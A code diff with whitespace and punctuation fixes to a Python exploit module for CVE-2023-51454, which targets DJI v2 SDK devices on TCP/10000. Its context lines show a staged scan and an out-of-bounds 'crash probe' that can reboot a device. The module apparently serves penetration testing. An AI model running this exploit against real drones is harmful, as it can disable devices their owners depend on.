@@ -39,12 +39,12 @@ Affected:
   All devices using DJI v2 SDK with TCP/10000 open
 
 References:
-  - https://nvd.nist.gov/vuln/detail/CVE-2023-51454
-  - https://github.com/ByteMe1001/DJI-CatNect
+ - https://nvd.nist.gov/vuln/detail/CVE-2023-51454
+ - https://github.com/ByteMe1001/DJI-CatNect
 
 MITRE ATT&CK:
-  T1190  - Exploit Public-Facing Application
-  T1203  - Exploitation for Client Execution
+  T1190 - Exploit Public-Facing Application
+  T1203 - Exploitation for Client Execution
 
 Author: Andre Henrique (@mrhenrike) | Uniao Geek
 Version: 1.0.0
@@ -175,7 +175,7 @@ class Exploit(HTTPClient):
             else:
                 print_warning("[Stage 1] Port open but no banner received")
         except ConnectionRefusedError:
-            print_warning(f"[Stage 1] Connection refused — port {self.port} not open")
+            print_warning(f"[Stage 1] Connection refused - port {self.port} not open")
             return
         except Exception as e:
             print_error(f"[Stage 1] Connection error: {e}")
@@ -201,12 +201,12 @@ class Exploit(HTTPClient):
                     resp = sock.recv(64)
                     print_info(f"[Stage 3] Response after overflow probe: {resp.hex()[:32]}")
                 except TimeoutError:
-                    print_success("[Stage 3] Timeout after overflow probe — crash/reset likely")
+                    print_success("[Stage 3] Timeout after overflow probe - crash/reset likely")
                 sock.close()
             except ConnectionResetError:
-                print_success("[Stage 3] Connection reset — OOB write confirmed (crash)")
+                print_success("[Stage 3] Connection reset - OOB write confirmed (crash)")
             except Exception as e:
-                print_success(f"[Stage 3] Exception: {type(e).__name__} — likely crash indicator")
+                print_success(f"[Stage 3] Exception: {type(e).__name__} - likely crash indicator")
         else:
             print_info("[Stage 3] Set do_crash=True to send OOB crash probe (may reboot device)")
 
